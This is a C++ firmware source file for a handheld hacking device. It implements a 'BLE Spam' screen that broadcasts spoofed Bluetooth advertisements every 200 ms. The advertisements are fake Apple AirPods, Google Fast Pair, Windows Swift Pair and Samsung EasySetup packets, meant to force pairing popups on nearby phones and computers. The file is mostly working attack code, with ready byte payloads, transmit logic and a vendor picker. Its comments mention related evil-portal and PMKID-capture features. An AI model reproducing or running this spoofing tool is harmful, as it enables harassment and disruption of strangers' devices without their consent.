#include "ble_spam.h"
#include "ble_common.h"
#include "../../ui/screen_scaffold.h"
#include "../../ui/screen_stack.h"
#include <Arduino.h> // Serial (real NimBLE return-code logging, same as c2link_ble.cpp/ble_scan.cpp)
#include <feature_registry.h>
#include <lvgl.h>
#include <host/ble_gap.h>
#include <host/ble_hs.h>
#include <cstring>

extern FeatureRegistry g_registry;

namespace BleSpamFeature {

// Apple Continuity "AirPods"-style advertisement payload -- a well-known,
// widely-referenced-in-donor-codebases fixed byte sequence advertising a
// fake AirPods pairing popup. Reproduced from the same public Apple
// Continuity protocol documentation Bruce/Poseidon's own ble_spam.cpp files
// cite (Apple manufacturer ID 0x004C, type 0x07 "Airpods").
//
// Task 8 (first plan) shipped this single payload as a proof-of-concept.
// This second plan's ble_spam task (2026-08-13) expanded it into the full
// multi-vendor table below (kFastPairPayload/kSwiftPairPayload/
// kSamsungPayload + kAirpodsPayload), selectable at runtime via the
// vendor-picker dropdown added to build_screen().
//
// Real payload byte formats for the three new entries, sourced from donor
// research (2026-08-13):
// - Fast Pair (Bruce FastPairExploitEngine::createFastPairAdvertisement):
//   Flags AD (02 01 06) + service-UUID AD (03 03 2C FE) + service-data AD
//   (06 16 2C FE <3-byte model ID> 02 0A C3). Triggers the Android "Pair
//   device?" popup.
// - Windows Swift Pair (Poseidon ble_sourapple.cpp): mfr ID 0x0006 (little-
//   endian 06 00), subtype bytes 03 00 80, followed by the advertised
//   device name.
// - Samsung EasySetup (Poseidon ble_sourapple.cpp): mfr ID 0x0075
//   (little-endian 75 00) triggers Samsung's Buds/Watch quick-pair sheet
//   with a minimal payload.
static const uint8_t kAirpodsPayload[] = {
    0x4C, 0x00, 0x07, 0x19, 0x07, 0x00, 0xC6, 0x00, 0x00, 0x00, 0x00,
    0x45, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static const uint8_t kFastPairPayload[] = {
    0x03, 0x03, 0x2C, 0xFE,                                     // service-UUID AD
    0x06, 0x16, 0x2C, 0xFE, 0x37, 0x11, 0xEA, 0x02, 0x0A, 0xC3,  // service-data AD, model ID 371 1EA
};
static const uint8_t kSwiftPairPayload[] = {
    0x06, 0x00, 0x03, 0x00, 0x80, 'Q', 'u', 'a', 'r', 'k', 'y',
};
static const uint8_t kSamsungPayload[] = {
    0x75, 0x00, 0x01, 0x00, 0x00, 0x00,
};

struct SpamPayload {
    const char *label;
    const uint8_t *mfg_or_svc_data;
    size_t len;
    bool is_service_data; // Fast Pair uses two AD structures (UUID+data);
                           // Swift Pair/Samsung/AirPods use one mfg-data AD.
};

static const SpamPayload kPayloads[] = {
    {"AirPods", kAirpodsPayload, sizeof(kAirpodsPayload), false},
    {"Fast Pair", kFastPairPayload, sizeof(kFastPairPayload), true},
    {"Swift Pair", kSwiftPairPayload, sizeof(kSwiftPairPayload), false},
    {"Samsung", kSamsungPayload, sizeof(kSamsungPayload), false},
};
static constexpr int kPayloadCount = sizeof(kPayloads) / sizeof(kPayloads[0]);
static int s_selected_payload = 0; // set by the vendor-picker dropdown, LVGL/main-task only (see poll())

static bool s_active = false;
static uint32_t s_last_rotate_ms = 0;
static lv_obj_t *s_status_label = nullptr;

// IMPORTANT, real architectural constraint (not a bug to fix silently):
// legacy BLE advertising (what c2link_ble.cpp already uses, and what this
// function uses too -- this project has not configured NimBLE's Extended
// Advertising, which is what would be needed for multiple *simultaneous*
// advertising instances) supports exactly ONE active advertisement at a
// time, system-wide. Starting this spam advertisement STOPS c2link_ble's
// existing C2 advertisement rather than running alongside it -- while BLE
// Spam is open, the Tab5 will not be discoverable/connectable as
// "Quarky-Tab5" for pairing. This is a real, disclosed tradeoff -- restoring
// the C2 advertisement when this screen closes is a reasonable follow-up
// (would need a small addition to c2link_ble.h/.cpp exposing a "re-arm
// advertising" call) but is left out of this task's scope; noted here and in
// the task report rather than silently shipping it undocumented. The C2
// advertisement does NOT resume on its own when this screen closes -- that
// is expected, disclosed behavior, not a bug to chase during hardware
// verification.

// Largest service-data AD payload this table can plausibly grow to hold,
// used to size the fixed adv[] buffer below. Fast Pair's 10 bytes is the
// only is_service_data entry today; 32 gives headroom for a future entry
// without needing a resize. Bounds-checked below rather than trusted blindly
// -- see the real sizing bug this replaces, noted in the task report.
static constexpr size_t kMaxServiceDataPayloadLen = 32;

static void send_one_advertisement() {
    ble_gap_adv_stop(); // no-op (returns an error this ignores) if nothing is currently advertising

    // Defensive 5ms settle delay between stop and the data-set call below
    // (covers both branches -- ble_gap_adv_set_data() in the is_service_data
    // branch and ble_gap_adv_set_fields() in the else branch -- since both
    // follow the same ble_gap_adv_stop() above). Real-hardware bug fix
    // (2026-08-16): the vendor-picker dropdown appeared to not change the
    // active spam payload -- selecting a different vendor kept broadcasting
    // whatever was previously configured. Root cause is the same async
    // stop/set-data race documented and fixed in ble_sourapple.cpp's
    // send_one() (see its comment, citing the donor's real hardware
    // debugging at ~/src/poseidon-tab5/src/features/ble_sourapple.cpp,
    // ~line 374-380): calling a NimBLE "set advertisement data" function
    // immediately after ble_gap_adv_stop() can silently fail because the BLE
    // controller is still asynchronously processing the previous stop, so
    // the radio keeps transmitting the PREVIOUS payload's content. This file
    // shipped and was real-hardware-verified back when it only ever
    // broadcast one fixed payload (AirPods), where an intermittent
    // set_fields() failure was indistinguishable from working correctly --
    // now that there are 4 selectable payloads, a failure specifically on
    // the cycle right after switching vendors reproduces exactly as "the
    // dropdown doesn't change the active spam type." Same fix, same value,
    // for the same reason: a 5ms delay here.
    delay(5);

    struct ble_hs_adv_fields fields{};
    fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
    const SpamPayload &p = kPayloads[s_selected_payload];
    if (p.is_service_data) {
        // Fast Pair's two-AD-structure shape can't go through
        // ble_hs_adv_fields' single mfg_data slot -- build the raw AD
        // bytes directly and hand them to ble_gap_adv_set_data() instead,
        // same escape hatch Poseidon's own ble_sourapple.cpp uses for
        // multi-AD-structure payloads NimBLE-Arduino's wrapper rejects.
        //
        // Fixed-size stack buffer (matching this codebase's existing
        // convention -- no std::vector anywhere in firmware/tab5/src),
        // sized off kMaxServiceDataPayloadLen rather than a specific
        // payload's sizeof(), with an explicit bounds check: this code path
        // runs generically for whichever payload kPayloads[s_selected_payload]
        // currently is, not just Fast Pair, so hardcoding a size here would
        // silently corrupt the stack the day a second is_service_data entry
        // with a different length is added to the table.
        if (p.len > kMaxServiceDataPayloadLen) {
            Serial.printf("quarky-tab5: [ble-spam] service-data payload len=%u exceeds buffer, skipping\n",
                          (unsigned)p.len);
            return;
        }
        uint8_t adv[3 + kMaxServiceDataPayloadLen];
        adv[0] = 0x02; adv[1] = 0x01; adv[2] = 0x06; // flags AD
        memcpy(adv + 3, p.mfg_or_svc_data, p.len);
        int rc = ble_gap_adv_set_data(adv, 3 + p.len);
        if (rc != 0) {
            Serial.printf("quarky-tab5: [ble-spam] adv_set_data rc=%d\n", rc);
            return;
        }
    } else {
        fields.mfg_data = p.mfg_or_svc_data;
        fields.mfg_data_len = p.len;
        int rc = ble_gap_adv_set_fields(&fields);
        if (rc != 0) {
            Serial.printf("quarky-tab5: [ble-spam] set_fields rc=%d\n", rc);
            return;
        }
    }

    struct ble_gap_adv_params adv_params{};
    adv_params.conn_mode = BLE_GAP_CONN_MODE_NON; // non-connectable -- this is a broadcast-only spoof, not a real peripheral
    adv_params.disc_mode = BLE_GAP_DISC_MODE_GEN;

    int rc = ble_gap_adv_start(BLE_OWN_ADDR_PUBLIC, NULL, BLE_HS_FOREVER, &adv_params, nullptr, nullptr);
    if (rc != 0) {
        Serial.printf("quarky-tab5: [ble-spam] adv_start rc=%d\n", rc);
    }
}

// Amendment (2026-08-12), same as Task 5/Task 7: build through build_sub_screen()
// (ui/screen_scaffold.h) rather than hand-rolling lv_obj_create(nullptr) + a
// manual Back button -- see screen_scaffold.cpp for the real hardware
// measurements that made hand-positioned Back buttons unusable.
static lv_obj_t *build_screen() {
    lv_obj_t *content = nullptr;
    lv_obj_t *screen = build_sub_screen("BLE Spam", &content);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);

    // Vendor picker, added this task: one lv_dropdown listing every
    // kPayloads[] entry, parented above the status label so it reads as
    // "pick a vendor, see status below" top-to-bottom. Options are
    // '\n'-joined -- LVGL's lv_dropdown parses '\n' as its option
    // separator (see widgets/dropdown/lv_dropdown.c), same convention
    // wifi_evil_portal.cpp's own template dropdown already uses; a
    // semicolon-joined string would render as a single unsplit option.
    char options[128];
    options[0] = '\0';
    for (int i = 0; i < kPayloadCount; i++) {
        if (i > 0) strcat(options, "\n");
        strcat(options, kPayloads[i].label);
    }
    lv_obj_t *vendor_dropdown = lv_dropdown_create(content);
    lv_dropdown_set_options(vendor_dropdown, options); // copies into LVGL's own storage
    lv_dropdown_set_selected(vendor_dropdown, s_selected_payload);
    lv_obj_add_event_cb(vendor_dropdown, [](lv_event_t *e) {
        lv_obj_t *dd = (lv_obj_t *)lv_event_get_target(e);
        s_selected_payload = lv_dropdown_get_selected(dd);
    }, LV_EVENT_VALUE_CHANGED, nullptr);

    s_status_label = lv_label_create(content);
    lv_label_set_text(s_status_label, "Spamming...");

    // s_active/s_status_label must not outlive the screen -- the scaffold's
    // Back button pops the screen and deletes it (and everything parented
    // under it, including this label) via ScreenStack::pop(). Clearing this
    // state from the label's own LV_EVENT_DELETE, rather than a Back-button
    // click handler, covers every path that can destroy it (not just a tap
    // on Back) -- same pattern ble_scan.cpp uses for its own s_list/
    // s_scanning teardown.
    //
    // Final whole-branch review finding I1 (2026-08-13): this used to clear
    // only s_active/s_status_label, leaving the last ble_gap_adv_start(...,
    // BLE_HS_FOREVER, ...) issued by send_one_advertisement() still live --
    // the Tab5 kept broadcasting the spoofed AirPods payload indefinitely
    // after Back was tapped, with no UI indicating it, matching neither
    // wifi_pmkid.cpp's nor ble_scan.cpp's precedent (both stop their radio
    // activity from this exact handler). Fixed by adding ble_gap_adv_stop()
    // here, symmetric with those two.
    //
    // This does NOT restore c2link_ble's C2 advertisement -- that remains
    // the disclosed, explicitly out-of-scope follow-up (a
    // c2link_ble_rearm_advertising() call, per the file-level comment
    // above). Stopping the transmitter is the part that must not wait;
    // re-arming the C2 link is real follow-up work, not a one-line fix.
    lv_obj_add_event_cb(s_status_label, [](lv_event_t *e) {
        s_active = false;
        s_status_label = nullptr;
        int rc = ble_gap_adv_stop();
        Serial.printf("quarky-tab5: [ble-spam] ble_gap_adv_stop rc=%d\n", rc);
    }, LV_EVENT_DELETE, nullptr);

    s_active = true;
    s_last_rotate_ms = 0; // force an immediate first send in poll()

    // Real-hardware verification diagnostic (2026-08-13, extended for the
    // multi-vendor picker): logging the exact address this advertisement
    // broadcasts under, so it can be searched for by MAC in a real BLE
    // scanner's results -- distinguishing "not broadcasting at all" from
    // "broadcasting, but not recognized/shown as a pairing popup by the
    // target OS" (the latter is a known, common outcome on hardened OS
    // versions for any of the four vendor payloads, not just AirPods; not a
    // code defect if the address IS found broadcasting the expected
    // payload).
    uint8_t own_addr_val[6];
    if (ble_hs_id_copy_addr(BLE_ADDR_PUBLIC, own_addr_val, nullptr) == 0) {
        char addr_str[18];
        ble_addr_to_str(own_addr_val, addr_str);
        Serial.printf("quarky-tab5: [ble-spam] broadcasting under address %s\n", addr_str);
    }

    return screen;
}

void register_module() {
    g_registry.register_module({"ble_spam", "BLE Spam", Category::BLE,
                                 Affinity::TAB5_NATIVE, start, nullptr});
}

void start() {
    ScreenStack::push(build_screen());
}

void poll() {
    if (!s_active) return;
    uint32_t now = millis();
    if (now - s_last_rotate_ms < 200) return;
    send_one_advertisement();
    s_last_rotate_ms = now;
}

} // namespace BleSpamFeature
